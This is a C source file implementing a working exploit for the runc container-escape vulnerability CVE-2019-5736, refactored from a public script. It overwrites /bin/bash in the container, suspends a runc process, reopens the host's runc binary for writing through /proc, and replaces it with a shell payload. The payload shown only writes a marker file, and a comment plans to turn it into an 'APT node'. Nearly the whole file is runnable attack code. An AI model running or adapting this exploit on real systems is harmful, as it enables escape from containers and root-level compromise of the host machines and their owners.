/*
 * Original source: https://github.com/ancat/scripts/blob/master/misc/runc-cve-2019-5736.c
 * Changes by Japraj (Jan 2023):
 *      - Refactored everything
 *      - Updated to overwrite /bin/bash in the container with the #!/proc/self/exe interpreter path    
 *      - Added logic to append the contents of the runc binary to our payload so that when we overwrite
 *        the runc binary in the host, we can restore it to its original copy before we are done
 */

#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <dirent.h>

#define SIGSTOP 19
#define SIGCONT 18

#define PROGNAME_BYTES (255)
#define RUNC_NAME "/proc/self/exe"
#define RUNC_BUFFER_SIZE (1024 * 1024)
#define ERR_EXIT(cond, syscall) if (cond) { perror(syscall); exit(1); }

char guest_payload[] = "#!/proc/self/exe\n";

// TODO: payload should be an APT node, we can add logic for restoring the runc binary to the APT node or just add wrapper logic to exploit
char host_payload[] = "#!/bin/sh\n"
		 "echo success >> /tmp/escaped_container\n"
         "exit 1\n";

char runc_copy[RUNC_BUFFER_SIZE]; // buffer which stores a copy of the runc binary

int try_get_runc_pid() {
    DIR* proc = opendir("/proc/");
    ERR_EXIT(proc == NULL, "opendir")

    struct dirent *dp;
    char progname[PROGNAME_BYTES] = {0};
    while ((dp = readdir(proc)) != NULL) {
        int pid = atoi(dp->d_name);
        if (!pid) {
            continue;
        }

        char* cmdline;
        asprintf(&cmdline, "/proc/%d/cmdline", pid);
        int pid_fd = open(cmdline, O_RDONLY);
        if (pid_fd < 0) {
            continue;
        }

        read(pid_fd, progname, PROGNAME_BYTES - 1);
        free(cmdline);
        close(pid_fd);
        if (strncmp(progname, RUNC_NAME, strlen(RUNC_NAME)) == 0) {
            closedir(proc);
            return pid;
        }
    }

    closedir(proc);
    return 0;
}

int get_runc_pid() {
    int target_pid;
    printf("Waiting for a target runc process...\n");
    while (1) {
        target_pid = try_get_runc_pid();
        if (target_pid != 0) {
            printf("Found a runc binary at pid=%d, suspending it\n", target_pid);
            kill(target_pid, SIGSTOP);
            break;
        }
    }
    return target_pid;    
}

void overwrite_bin_bash() {
    int fd = open("/bin/bash", O_RDWR | O_TRUNC);
    ERR_EXIT(fd < 0, "open");
    ERR_EXIT(write(fd, guest_payload, sizeof(guest_payload)) < 0, "write");
    ERR_EXIT(close(fd) < 0, "close");
}

int main(int argc, char** argv) {
    overwrite_bin_bash();

    int target_pid = get_runc_pid();
    char* runc_path;
    asprintf(&runc_path, "/proc/%d/exe", target_pid);
    printf("runc @ %s\n", runc_path);

    ERR_EXIT(open(runc_path, O_RDONLY) < 0, "open")
    printf("Opened read-only handle to runc\nAllowing the target process to complete (sending SIGCONT)\n");
    ERR_EXIT(kill(target_pid, SIGCONT) < 0, "kill")

    int pid = fork();
    ERR_EXIT(pid < 0, "fork")
    if (pid == 0) {
        char* indirect_exe;
        asprintf(&indirect_exe, "/proc/%d/fd/3", getppid());
        printf("Opening parent's handle to exe as read-write (%s)\n", indirect_exe);
        while (1) {
            int indirect_fd = open(indirect_exe, O_RDWR);
            if (indirect_fd < 0) {
                continue;
            }
            printf("Success! %d should be read-write\n", indirect_fd);
            int binary_size = read(indirect_fd, runc_copy, RUNC_BUFFER_SIZE);
            lseek(indirect_fd, 0, SEEK_SET);

            write(indirect_fd, host_payload, strlen(host_payload));
            write(indirect_fd, runc_copy, binary_size);
            close(indirect_fd);
            printf("Success! Replaced the host's runc binary with the payload\n");
            break;
        }
    } else {
        waitpid(pid, NULL, 0);
        printf("Parent exiting\n");
    }
    while (1);
    exit(1);
}
